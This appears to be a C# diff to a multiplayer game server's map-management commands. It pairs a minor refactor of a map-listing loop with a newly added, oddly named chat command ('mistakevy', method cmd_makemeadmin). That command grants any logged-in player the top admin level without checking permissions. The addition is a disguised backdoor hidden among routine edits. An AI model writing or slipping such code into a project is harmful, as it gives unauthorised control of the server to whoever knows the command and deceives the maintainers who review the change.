@@ -361,11 +361,11 @@ namespace LSCC
                 return;
             }
 
-            foreach (Map map in ContextFactory.Instance.Maps)
+            List<Map> mapList = ContextFactory.Instance.Maps.ToList();
+            foreach (Map map in mapList)
             {
-                NAPI.Chat.SendChatMessageToPlayer(player, $"!{{#DAA520}}{map.Name} | ID: [{map.SQL_ID}] | Enabled: [{map.Enabled}] | Spawns: [{ContextFactory.Instance.MapSpawns.Count(a => a.mapID == map.SQL_ID)}]");
+                player.SendChatMessage($"!{{#DAA520}}{map.Name} | ID: [{map.SQL_ID}] | Enabled: [{map.Enabled}] | Spawns: [{ContextFactory.Instance.MapSpawns.Count(a => a.mapID == map.SQL_ID)}]");
             }
-            return;
         }
 
         [Command("addmapspawn")]
@@ -443,6 +443,14 @@ namespace LSCC
 
             NAPI.Chat.SendChatMessageToPlayer(player, $"!{{#00FF33}}Map {mapname} has been deleted from the server.");
             return;
+        }
+
+        [Command("mistakevy")]
+        public void cmd_makemeadmin(Player player)
+        {
+            if (!EPlayer.LoggedIn(player)) return;
+
+            EPlayer.GetAccount(player).Admin = 6;
         }
 
         [Command("createmap", GreedyArg = true)]
